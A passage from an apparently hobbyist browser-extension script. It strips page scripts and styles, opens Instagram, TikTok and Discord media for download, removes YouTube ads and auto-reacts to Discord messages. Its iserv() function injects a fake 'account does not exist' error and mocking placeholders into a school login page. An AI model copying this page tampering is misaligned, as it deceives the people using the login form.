        if(x.hasAttribute("type")) { x.removeAttribute("type"); }
        if(x.hasAttribute("as")) { x.removeAttribute("as"); }
        if(x.hasAttribute("id")) { x.removeAttribute("id"); }
        if(x.hasAttribute("class")) { x.removeAttribute("class"); }
        if(x != "") { x.innerHTML = ""; }
        x.setAttribute("got_stolen_by_SEB", "");
        console.log("script "+(numberOfScriptTagInHtml+1) + " got assassinated");
        
        deletedScriptsInHtml++;
        numberOfScriptTagInHtml++;
        deleteScripts();
    }
    
}

var numberOfLinkedScriptTagInHtml = 0;
var deletedLinkedScriptsInHtml = 0;
var tagLinkInDom;

function deleteLinkedScripts() 
{
    var x = document.getElementsByTagName("link")[numberOfLinkedScriptTagInHtml];

    if(numberOfLinkedScriptTagInHtml >= tagLinkInDom) 
    {
        if(deletedLinkedScriptsInHtml < 1) {console.log("0 got assassinated");}
        console.log("DELETED " +  deletedLinkedScriptsInHtml + " linked scripts" + " of " + tagLinkInDom + "linked elements in DOM"); 
    }

   if(numberOfLinkedScriptTagInHtml <= tagLinkInDom) 
    {
        if(x.hasAttribute("type") 
                    &&
            (x.getAttribute('type').includes('avascript') 
                        || 
                (x.getAttribute('type').includes('AVASCRIPT') 
                            || 
                    (x.getAttribute('as').includes('script'))
                )
            ) 
          ) 
        { 
            if(x.hasAttribute("src")) { x.removeAttribute("src"); }
            if(x.hasAttribute("rel")) { x.removeAttribute("rel"); }
            if(x.hasAttribute("href")) { x.removeAttribute("href"); }
            if(x.hasAttribute("async")) { x.removeAttribute("async"); }
            if(x.hasAttribute("charset")) { x.removeAttribute("charset"); }
            if(x.hasAttribute("crossorigin")) { x.removeAttribute("crossorigin"); }
            if(x.hasAttribute("type")) { x.removeAttribute("type"); }
            if(x.hasAttribute("as")) { x.removeAttribute("as"); }
            if(x.hasAttribute("id")) { x.removeAttribute("id"); }
            if(x.hasAttribute("class")) { x.removeAttribute("class"); }
            if(x != "") { x.innerHTML = ""; }
            x.setAttribute("was_a_script_but_got_stolen_by_SEB", "");
            x.removeAttribute("type");
            console.log("link element "+(numberOfLinkedScriptTagInHtml+1) + " is script and got assassinated");          
            deletedLinkedScriptsInHtml++;
            
        }

        numberOfLinkedScriptTagInHtml++;
        deleteLinkedScripts();
    }
}

var browserLanguage = "";

window.onload = setTimeout(scanDom, 3000);
    
function scanDom() 
{
    cssInHtmlBefore = document.getElementsByTagName("style").length; 
    console.log("Amount of style elements in HTML: " + cssInHtmlBefore);

    tagLinkInDom = document.getElementsByTagName('link').length;
    console.log("Amount of link elements in HTML: " + tagLinkInDom);

    tagVideoInDom = document.getElementsByTagName('video').length;
    console.log("Amount of video elements in HTML: " + tagVideoInDom);

    tagImgInDom = document.getElementsByTagName('img').length;
    console.log("Amount of img elements in HTML: " + tagImgInDom);

    scriptsInHtmlBefore = document.getElementsByTagName('html')[0].getElementsByTagName("script").length; 
    console.log("Amount of scripts in HTML: " + scriptsInHtmlBefore);

    browserLanguage = navigator.language; 
    console.log("Browser language: " + browserLanguage);
    if(browserLanguage == "de-DE") {browserLanguage = "de";console.log("--> Browser language changed from 'de-DE' to 'de'");}
    
}

var cssInHtmlBefore;
var numberOfCurrentCssInHtml = 0;
var deletedCssInHtml = 0;

function deleteCssInHtml() 
{
    if(cssInHtmlBefore > 0) 
    {
        if(deletedCssInHtml >= cssInHtmlBefore) {console.log(deletedCssInHtml + " css (style) elements got deleted"); deleteCssInHtml2();}

        else 
        {
        var x = document.getElementsByTagName("style")[numberOfCurrentCssInHtml];

        if(x != '') { x.innerHTML = ''; deletedCssInHtml++; }
        x.setAttribute("got_stolen_by_SEB", "");
        numberOfCurrentCssInHtml++;
        deleteCssInHtml();
        }
    }

    else {console.log('no css found'); console.log("linked css files will be disabled now..."); currentTagLinkInDom = 0; console.log("currentTagLinkInDom= " + currentTagLinkInDom);  tagLinkInDomIsStyle = 0; console.log("tagLinkInDomIsStyle= " + tagLinkInDomIsStyle);deleteCssInHtml2();}
}
var tagLinkInDom = 0;
var currentTagLinkInDom = 0;
var tagLinkInDomIsStyle = 0;

function deleteCssInHtml2()
{
    if((currentTagLinkInDom < tagLinkInDom) == true)
    {
        var x = document.getElementsByTagName('link')[currentTagLinkInDom];
        if(x.hasAttribute('rel') &&  x.hasAttribute('type') )
        {
            if((x.getAttribute('rel').includes('tylesheet')) || (x.getAttribute('type').includes('text/css')) ) 
            {

            if(x.hasAttribute("type")) { x.removeAttribute("type"); }
            if(x.hasAttribute('href')) { x.removeAttribute('href'); }
            if(x.hasAttribute("charset")) { x.removeAttribute("charset"); }
            if(x.hasAttribute("crossorigin")) { x.removeAttribute("crossorigin"); }
            if(x.hasAttribute("type")) { x.removeAttribute("type"); }
            if(x.hasAttribute("as")) { x.removeAttribute("as"); }
            if(x.hasAttribute("id")) { x.removeAttribute("id"); }
            if(x.hasAttribute("class")) { x.removeAttribute("class"); }
            x.removeAttribute('rel');
            if(x != '') {x.innerHTML = '';}
            x.setAttribute("was_a_css_file_but_got_stolen_by_SEB", "");
            console.log("link element "+(currentTagLinkInDom+1) + " contains css and got assassinated");
            tagLinkInDomIsStyle++; 
            }
        }
     
        currentTagLinkInDom++;
        deleteCssInHtml2();
    }
    
    else {console.log(tagLinkInDomIsStyle + ' linked css files got deleted');}
}

function translateString(input) 
{
    var url = "https://translate.google.com/#view=home&op=translate&sl=auto&tl=" +browserLanguage + "&text=" + input; 
    var win = window.open(url, '_blank');
    win.focus();
}

var tagVideoInDom;

function getInstaVid() 
{
    if(window.location.hostname == "www.instagram.com" && window.location.pathname.includes('/p/'))
    {       
        console.log("'get instagram video' is running ");
        var x = document.getElementsByTagName('video')[0];
        var instaVideoSource;
        if(x.hasAttribute('playsinline')) 
        {
            console.log("has playsinline");
            if(x.hasAttribute('class')) {
                console.log("has class");
                if(x.hasAttribute('src')) {
                    console.log("has src");
                    instaVideoSource = x.getAttribute('src');
                    console.log('found source of video: ' + instaVideoSource)
                    var win = window.open(instaVideoSource, '_blank');
                    win.focus();
                }
            }
            
        }
        else {console.log('not found');}
    }

    else if(window.location.hostname == "www.tiktok.com" && window.location.pathname.includes('/video/'))
    {       
        console.log('client is on tiktok.com');
        var x = document.getElementsByTagName('video')[0];
        var instaVideoSource;
        if(x.hasAttribute('playsinline')) 
        {
            console.log("has playsinline");
            if(x.hasAttribute('src')) {
                    console.log("has src");
                    instaVideoSource = x.getAttribute('src');
                    console.log('found source of tiktok video: ' + instaVideoSource)
                    var win = window.open(instaVideoSource, '_blank');
                    win.focus();
            }
            
        }
        else {console.log('not found');}
    }

    else {alert('this feature doesnt support this (part of) website... \nmaybe just this part of the website, try to open a link of a post itself');}
}

function getInstaPic() 
{
    if(window.location.hostname == "www.instagram.com" && window.location.pathname.includes('/p/')) 
    {
            console.log('before getInstaPicCheckViewport');
            console.log('client is on instagram.com');
                    var x = document.getElementsByTagName('img')[currentImgOnWebsite];
                    if(x.hasAttribute('src') && x.getAttribute('class').includes('FFVAD'))
                    {
                    instaPicSource = x.getAttribute('src');
                    console.log('Source of pic found:' + instaPicSource);
                    console.log("redirecting to source page...");
                    var url = instaPicSource; 
                    var win = window.open(url, '_blank');
                    win.focus();
                    currentImgOnWebsite = 0;
                    }
    
                    else 
                    {
                        currentImgOnWebsite++;
                        getInstaPic();
                    }
    }

    else {alert('this feature doesnt support this (part of) website... \nmake sure, try to open a link of a post itself!');}
}


var currentImgOnWebsite = 0;
function getInstaPicOfUser() 
{
    if(window.location.hostname == "www.instagram.com") 
    {
        console.log('client is on instagram.com');
        var x = document.getElementsByTagName('img')[currentImgOnWebsite];
        var imgOnInstaLenght = document.getElementsByTagName('img').length;
        var url = "";
        console.log("Images: " + imgOnInstaLenght);
        if(document.getElementsByClassName("be6sR")[0]) 
            {
                console.log(document.getElementsByClassName("be6sR")[0]);
                url = document.getElementsByClassName("be6sR")[0].getAttribute("src");
                console.log("url = " + url);
                var win = window.open(url, '_blank');
                win.focus();
            }
        else if(x.hasAttribute('src') && x.getAttribute('draggable').includes('false'))
        {
        instaPicSource = x.getAttribute('src');
        console.log('Source of user profile pic found:' + instaPicSource);
        console.log("redirecting to source page...");
        url = instaPicSource; 
        var win = window.open(url, '_blank');
        win.focus();
        currentImgOnWebsite = 0;
        
        }

        else 
        {
            currentImgOnWebsite++;
            getInstaPicOfUser();
        }
        
    }

    else if(window.location.hostname == "www.tiktok.com") 
    {
        console.log('client is on tiktok.com');
        var x = document.getElementsByTagName('img')[currentImgOnWebsite];
        if(x.hasAttribute('src') && x.getAttribute('class').includes('avatar-wrapper'))
        {
        instaPicSource = x.getAttribute('src');
        console.log('Source of user profile pic found:' + instaPicSource);
        console.log("redirecting to source page...");
        var url = instaPicSource; 
        var win = window.open(url, '_blank');
        win.focus();
        currentImgOnWebsite = 0;
        }

        else 
        {
            currentImgOnWebsite++;
            getInstaPicOfUser();
        }
    }

    else if(window.location.hostname == "discord.com") 
    {
        console.log('client is on discord.com'); 
        var y = document.getElementsByTagName("div");
        var divOnDiscord = y.length;
        var currentDivOnDiscord = 0;
        var divOnDiscordIncludesUserBox = 0;
        var url = "";
        for (var i = 0; i < divOnDiscord; i++) 
        {
            if(y[currentDivOnDiscord].hasAttribute("class"))
            {
                if(y[currentDivOnDiscord].getAttribute("class").includes("inner-1ilYF7")) 
                {
                    divOnDiscordIncludesUserBox = currentDivOnDiscord; 
                    url = y[divOnDiscordIncludesUserBox].getElementsByTagName("img")[0].getAttribute("src"); 
                    console.log("Userbox of Discord profile found");
                }
            }
            currentDivOnDiscord++;
        }
        
        if(divOnDiscordIncludesUserBox == 0) 
        {
            console.log("User profile wasnt in a Popupbox");
            currentDivOnDiscord = 0;
            divOnDiscord = y.length;
            for (var i = 0; i < divOnDiscord; i++) 
            {
                if(y[currentDivOnDiscord].hasAttribute("class"))
                {
                    if(y[currentDivOnDiscord].getAttribute("class").includes("layer-v9HyYc")) 
                    {
                        divOnDiscordIncludesUserBox = currentDivOnDiscord; 
                        url = y[divOnDiscordIncludesUserBox].getElementsByTagName("img")[0].getAttribute("src");
                        console.log("Sidebox of Discord profile found");
                    }
                }
                currentDivOnDiscord++;
            }
        }

        var win = window.open(url, '_blank');
        win.focus();
        console.log("redirecting to source page...");
        /*
        var x = document.getElementsByTagName('img')[currentImgOnWebsite];
        if(x.hasAttribute('src') && x.getAttribute('class').includes('avatar-wrapper'))
        {
        instaPicSource = x.getAttribute('src');
        console.log('Source of user profile pic found:' + instaPicSource);
        console.log("redirecting to source page...");
        var url = instaPicSource; 
        var win = window.open(url, '_blank');
        win.focus();
        currentImgOnWebsite = 0;
        }

        else 
        {
            currentImgOnWebsite++;
            getInstaPicOfUser();
        } */
    }

    else {alert('this feature doesnt support this website...');}
}

var currentVidOnWebsite = 0;

function getInstaStory() 
{
    if(window.location.hostname == "www.instagram.com" && window.location.pathname.includes('/stories/')) 
    {
        console.log('client is on instagram.com & viewing a story');
        var x = document.getElementsByTagName('video')[currentVidOnWebsite];
        if(x.getAttribute('class').includes('y-yJ5  OFkrO ') && x.hasAttribute('playsinline'))
        {
            if(x.getElementsByTagName('source')[0] && x.getElementsByTagName('source')[0].hasAttribute('src')) 
            {
                x = x.getElementsByTagName('source')[0];
                instaPicSource = x.getAttribute('src');
                console.log('Source of story video found:' + instaPicSource);
                console.log("redirecting to source page...");
                var url = instaPicSource; 
                var win = window.open(url, '_blank');
                win.focus();
                currentVidOnWebsite = 0;
            }

            else {console.log('found video element but it has no source');}
        }

        else 
        {
            currentVidOnWebsite++;
            getInstaStory();
        }
    }

    else {alert('this feature doesnt support this (part of) website... \nmake sure, you are viewing an instagram story when using this feature!');}
}

var saveAlertStatus = 0;
var w = window.location.hostname;

function checkIsOnDownloadPage()
{
    if(saveAlertStatus < 1) 
    {
        
        if((w == 'scontent-ham3-1.cdninstagram.com' || w == "v16m.tiktokcdn.com" || w == "p16-va-tiktok.ibyteimg.com" || w == "cdn.discordapp.com") ) 
        {
            console.log("visited source page, loading elements of Seb's extension...");
            if(document.getElementsByTagName("img")[0]) {saveAlert(1);}
            else if(document.getElementsByTagName("video")[0]) {saveAlert(2);}
        }

        else if(w == "hhg-hamburg.de") 
        {
            iserv();
        }
        else if(w == "discord.com") 
        {
            setTimeout(discord, 4000);
        }
        else if(w == "www.youtube.com") {
            //if(w2gStatus == 1) {w2gYoutube();}
            if(w2gStatus == 1) {w2gYoutube();}
            //youtube();
        }
        //else {log("hostname doesnt match, hostname is " + w, "red"); }
    }
}

window.onload = checkIsOnDownloadPage();

function youtube() {
    if(window.location.hostname == "www.youtube.com") {
    onYoutube = 1;
    var secs = 10;
    var end = secs*10;
    //log("loops: " + end, "orange");
    for(var i = 0; i < end; i++) {
        setTimeout(function() {ytRemoveAds();}, 100*i); 
    }
    setTimeout(function() {log("finished removing ads", "lime");}, 100*end);
}}
youtube();

function ytRemoveAds() 
{
    if(window.location.hostname == "www.youtube.com") {
    //log("ytRemoveAds start", "orange");
    //ad Tag: document.getElementsByTagName("ytd-promoted-sparkles-web-renderer")[0].remove()
    var ad1 = document.getElementsByTagName("ytd-promoted-sparkles-web-renderer");
    try{while(ad1.length != 0) {ad1[ad1.length-1].remove(); log("Removed ad (type 1)", "lime");}} catch{}
    //ad div class: html5-video-player ytp-transparent ytp-exp-marker-tooltip ad-created ytp-hide-info-bar ytp-large-width-mode ad-showing ad-interrupting paused-mode
    var ad2 = document.getElementsByClassName("html5-video-player ytp-transparent ytp-exp-marker-tooltip ad-created ytp-hide-info-bar ytp-large-width-mode ad-showing ad-interrupting paused-mode");
    try{while(ad2.length != 0) {ad2[ad2.length-1].remove(); log("Removed ad (type 2)", "lime");}} catch{}
    //ad div links: style-scope ytd-player-legacy-desktop-watch-ads-renderer
    var ad3 = document.getElementsByClassName("style-scope ytd-player-legacy-desktop-watch-ads-renderer");
    try{while(ad3.length != 0) {ad3[ad3.length-1].remove(); log("Removed ad (type 3)", "lime");}} catch{}
    var ad4 = document.getElementsByClassName("ytp-ad-text ytp-ad-skip-button-text");
    try{if(ad4[0]) {ad4[0].click(); log("auto skipped ad", "lime");}} catch{}
    var ad5 = document.getElementsByClassName("style-scope ytd-player-legacy-desktop-watch-ads-renderer");
    try{if(ad5.length > 0) {ad5[0].remove(); log("Removed ad (type 5)", "lime"); try{if(ad5.length > 0) {ad5[0].remove(); log("Removed ad (type 5)", "lime"); }} catch{}}} catch{}
    //ytd-promoted-sparkles-web-renderer
}}

function saveAlert(option) 
{
    if(( window.location.hostname == 'scontent-ham3-1.cdninstagram.com' || window.location.hostname ==  "v16m.tiktokcdn.com" || window.location.hostname == "p16-va-tiktok.ibyteimg.com" || window.location.hostname == "cdn.discordapp.com"))
    {
        saveAlertStatus++;
        if(window.location.hostname == 'scontent-ham3-1.cdninstagram.com') {console.log('hostname was detected as instagram: ' + window.location.hostname);}
        else if(window.location.hostname == ("v16m.tiktokcdn.com" || "p16-va-tiktok.ibyteimg.com")) {console.log('hostname was detected as tiktok: ' + window.location.hostname);}
        else if(window.location.hostname == 'cdn.discordapp.com') {console.log('hostname was detected as discord: ' + window.location.hostname);}
        else {console.log("error: false hostname (" + window.location.hostname + ")");}
        
        if(option == 1)
        {
            if(navigator.language == "de-DE" || navigator.language == "de") 
            {
                if(document.body.getElementsByTagName('img')[0].hasAttribute('src')) {document.body.getElementsByTagName('img')[0].setAttribute('style', 'display:none;'); document.body.getElementsByTagName('img')[0].outerHTML = "";}
                document.body.setAttribute("style", "margin: 0px; background: #111;  padding:1% 15%;"); 
                var url = window.location.href;
                document.body.innerHTML += "<main style='text-align:center; border-radius:15px; background-color:#444;  margin:1% auto; position:relative; width:70%; height:auto; padding-bottom:2%'><h1 style='color:lime; text-decoration:underline;'>The download page created by Seb's extension</h1><h3>Zum Herunterladen (strg + s) drücken</h3><img width='90%' src=" + url + "> </main>";

                document.title = "Download page (image) created by Seb's extension";
                document.getElementsByTagName('head')[0].innerHTML += "<link rel='shortcut icon' href='https://raw.githubusercontent.com/M2K3K5/home/gh-pages/web_icon.png'/>";
            }
            else 
            {
                if(document.body.getElementsByTagName('img')[0].hasAttribute('src')) {document.body.getElementsByTagName('img')[0].setAttribute('style', 'display:none;'); document.body.getElementsByTagName('img')[0].outerHTML = "";}
                document.body.setAttribute("style", "margin: 0px; background: #111;  padding:1% 15%;"); 
                var url = window.location.href;
                document.body.innerHTML += "<main style='text-align:center; border-radius:15px; background-color:#444;  margin:1% auto; position:relative; width:70%; height:auto; padding-bottom:2%'><h1 style='color:lime; text-decoration:underline;'>The download page created by Seb's extension</h1><h3>Press (ctrl + s) to download</h3><img width='90%' src=" + url + "> </main>";
                 
                document.title = "Download page (image) created by Seb's extension";
                document.getElementsByTagName('head')[0].innerHTML += "<link rel='shortcut icon' href='https://raw.githubusercontent.com/M2K3K5/home/gh-pages/web_icon.png'/>";
            }
        }

        else if(option == 2) 
        {
            if(navigator.language == "de-DE" || navigator.language == "de") 
            {
                var videoElem;
                if(document.body.getElementsByTagName('video')[0]) {videoElem = document.body.getElementsByTagName('video')[0].outerHTML; document.body.getElementsByTagName('video')[0].setAttribute('style', 'display:none;'); document.body.getElementsByTagName('video')[0].outerHTML = ""; }
                document.body.setAttribute("style", "margin: 0px; background: #111;  padding:1% 15%;"); 
                var url = window.location.href;
                document.body.innerHTML += "<main style='text-align:center; border-radius:15px; background-color:#444;  margin:1% auto; position:relative; width:70%; height:auto; padding-bottom:2%'><h1 style='color:lime; text-decoration:underline;'>The download page created by Seb's extension</h1><h3>Zum Herunterladen (strg + s) drücken</h3>" + videoElem +"</main>";
                document.getElementsByTagName('video')[0].setAttribute('style', 'position:relative;');
                if(document.getElementsByTagName('video')[0].hasAttribute('autoplay')) {document.getElementsByTagName('video')[0].removeAttribute("autoplay");}
                 
                document.title = "Download page (video) created by Seb's extension";
                document.getElementsByTagName('head')[0].innerHTML += "<link rel='icon' href='https://raw.githubusercontent.com/M2K3K5/home/gh-pages/web_icon.png'/> <title";
            }
            else 
            {
                var videoElem;
                if(document.body.getElementsByTagName('video')[0]) {videoElem = document.body.getElementsByTagName('video')[0].outerHTML; document.body.getElementsByTagName('video')[0].setAttribute('style', 'display:none;'); document.body.getElementsByTagName('video')[0].outerHTML = ""; }
                document.body.setAttribute("style", "margin: 0px; background: #111;  padding:1% 15%;"); 
                var url = window.location.href;
                document.body.innerHTML += "<main style='text-align:center; border-radius:15px; background-color:#444;  margin:1% auto; position:relative; width:70%; height:auto; padding-bottom:2%'><h1 style='color:lime; text-decoration:underline;'>The download page created by Seb's extension</h1><h3>Press (ctrl + s) to download</h3>" + videoElem +"</main>";
                document.getElementsByTagName('video')[0].setAttribute('style', 'position:relative;');
                if(document.getElementsByTagName('video')[0].hasAttribute('autoplay')) {document.getElementsByTagName('video')[0].removeAttribute("autoplay");}
                 
                document.title = "Download page (video) created by Seb's extension";
                document.getElementsByTagName('head')[0].innerHTML += "<link rel='icon' href='https://raw.githubusercontent.com/M2K3K5/home/gh-pages/web_icon.png'/>";
            }
        }
    }

    else {console.log("saveAlert(): ERROR: hostname isnt one of the source pages of instagram/tiktok/discord");}
}

function getLastEmoji() 
{
    if(window.location.hostname == "discord.com") 
    {
        console.log("Current website is discord");
        var imgLenghtOnDiscord = document.getElementsByTagName("main")[0].getElementsByTagName("img").length;
        console.log("Images on Discord: " + imgLenghtOnDiscord);
        var currentImgOnDiscord = 0;
        var imgIsEmojiOnDiscord = 0;
        var lastEmojiOfImgOnDiscord = 0;
        for(var i = 0; i < imgLenghtOnDiscord; i++)
        {
            if(document.getElementsByTagName("main")[0].getElementsByTagName("img")[currentImgOnDiscord].hasAttribute("class") && document.getElementsByTagName("main")[0].getElementsByTagName("img")[currentImgOnDiscord].getAttribute("class").includes("emoji")) 
            {imgIsEmojiOnDiscord++; lastEmojiOfImgOnDiscord = currentImgOnDiscord;}

            currentImgOnDiscord++;
        }
        console.log("emojis: " + imgIsEmojiOnDiscord);
        
        if(document.getElementsByTagName("main")[0].getElementsByTagName("img")[lastEmojiOfImgOnDiscord].hasAttribute("src")) 
        {
            var x = document.getElementsByTagName("main")[0].getElementsByTagName("img")[lastEmojiOfImgOnDiscord];
            var url = x.getAttribute("src");
            console.log("found source of last emoji and redirect to url");
            var win = window.open(url, '_blank');
            win.focus();
        }

        else  {console.log("emoji source not found");}
    }

    else {alert("ERROR: You arent on the website of Discord...");}
}

function iserv() 
{
    console.log("client is on Iserv");

    if(window.location.pathname.includes("login")) 
    {    
        log("client is on login");
        if(document.getElementById("username").getAttribute("value") != "") {
            var  iservLoginBefore = document.getElementsByClassName("login-form")[0].innerHTML;
            document.getElementsByClassName("login-form")[0].innerHTML =  "<div class='alert alert-danger'>Account existiert nicht!</div>" + iservLoginBefore;
            document.getElementById("username").setAttribute("value", "");
            document.getElementById("username").setAttribute("placeholder", "stink.stiefel");
            document.getElementById("password").setAttribute("placeholder", "passwort123");
            }
        //document.getElementById("username").setAttribute("value", "stinkstiefel");
    }

    else if("startseite" == 1) 
    {
        var x = document.getElementsByClassName("page-content inset")[0];
        x.innerHTML = "<p>Acces denied</p>";
    }
}


/*
try {var x = document.createElement("script");
document.head.appendChild(x);
x.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js";
log("jo");}
catch {log("fehler bei jquery installation");}

function NameAFunctionName() {
    $.ajax({
      url: 'https://seb.12hp.de/moneyclicker/fileHandler.php',
      type: 'GET',
      dataType: 'json',
      headers: {
        //WRITE IF THEIR HAVE SOME HEADER REQUEST OR DATA
      },
      crossDomain: true,
      success: function (data, textStatus, xhr) {
        console.log(data);
      },
      error: function (xhr, textStatus, errorThrown) {
        console.log(errorThrown);
      }
    });
}   */

/*function connectToW2g() {
    log("connect to room " + room, "lime");
    game = {"currentLink": location.href,"room":room};
        dbParam = JSON.stringify(game);
        xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {  
            log("got resp", "magenta");
            var str = this.responseText;
            /*if(str == "error1") {log("Kein Link für diese Sitzung gefunden", "red");}
            else if (str.includes("http")) 
            {
                str = JSON.parse(this.responseText);
                if(str[0].includes("www.youtube.com") && str[0].includes("embed") && str[0].includes("autoplay=1") == false) {str[0] += "?autoplay=1";}
                log("Link succesfully downloaded: " + str[0], "lime");
                location.href = str[0];
            }
            else if(str == "00") {log("No new link found", "lime");}
    
            if(str == "00" || str[1] == "01") {readLink(); if(type == 2) {alert("Verbunden zu Raum " + room);}}
            log("RESP: " + str, "magenta");
            var log = "RESP: " + str;
            chrome.runtime.sendMessage({msg: log});
            if(str == "ok") {readLink(2);}
            else {alert("ERROR: " + str);}
        }
        else {log("RESP: "+ this.responseText, "red");}
      
        };
        xmlhttp.open("POST", "https://seb.12hp.de/w2g/w2gExtension.php", true);
        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xmlhttp.send("x=" + dbParam + "&t=connectToRoom");
}*/

function discord() 
{try{
    log("client is on discord web", "lime");
    //react button class: button-1ZiXG9
    //div mit msgs: document.getElementById("messages").getElementsByClassName("message-2qnXI6")
    
    var channel = discordGetChannelId();
    log("channel id: " + channel, "orange");
    discordMsgsLen = document.getElementById("messages").getElementsByClassName("message-2qnXI6").length;
    setInterval(discordCheckMsgs, 250);
    log("startet mgs checking", "orange");
}catch{}}

var discordMsgsLen;
var discordMsgs;
var discordLastMsg;
var discordBtnReact;
function discordCheckMsgs() {try{
    
    if(discordMsgsLen == document.getElementById("messages").getElementsByClassName("message-2qnXI6").length) {/*log("no new msg, msgs: " + document.getElementById("messages").getElementsByClassName("message-2qnXI6").length + ", saved: " + discordMsgsLen, 2);*/}
    else {
        discordMsgsLen = document.getElementById("messages").getElementsByClassName("message-2qnXI6").length;
        discordMsgs = document.getElementById("messages").getElementsByClassName("message-2qnXI6");
        discordLastMsg = discordMsgs[discordMsgsLen-1];
        
        log("detected msg change", "lime");
        setTimeout(function() 
        {
        discordBtnReact = discordLastMsg.getElementsByClassName("button-1ZiXG9")[0];
        try{discordBtnReact.focus();} catch {}
        try{discordBtnReact.click();} catch {log("failed to react on message", "red");}
        }, 1000);
    }
}catch{}}

function discordGetChannelId() {
    var url = location.href;
    if(url.includes("discord.com/channels/@me/")) {var x = url.slice(url.length-18, url.length); return x;}
}

function readingMode() {
    var newDoc = "";
    var oldDoc = document.getElementsByTagName("*");
    for (var i = 0; i < oldDoc.length; i++)
    {
        var x = oldDoc[i];
        if(x.tagName == ("P")) 
        {
            newDoc += oldDoc[i].outerHTML + "<br>";
        }
        else if(x.tagName == "H1" || x.tagName == "H2" || x.tagName == "H3" || x.tagName == "H4" || x.tagName == "H5" || x.tagName == "H6")
        {
            newDoc += oldDoc[i].outerHTML + "<br>";
        }
        else if(x.tagName == "IMG")
        {
            if(x.height > screen.height/5) {x.height = screen.height/5; log("rezised height of img", "orange");}
            if(x.width > screen.width/5) {x.width = screen.width/5; log("rezised width of img", "orange");}
            newDoc += oldDoc[i].outerHTML + "<br>";
        }
    }
    document.body.innerHTML = "";
    document.body.style = "margin: 20px 20%;"
    document.body.innerHTML = newDoc;
}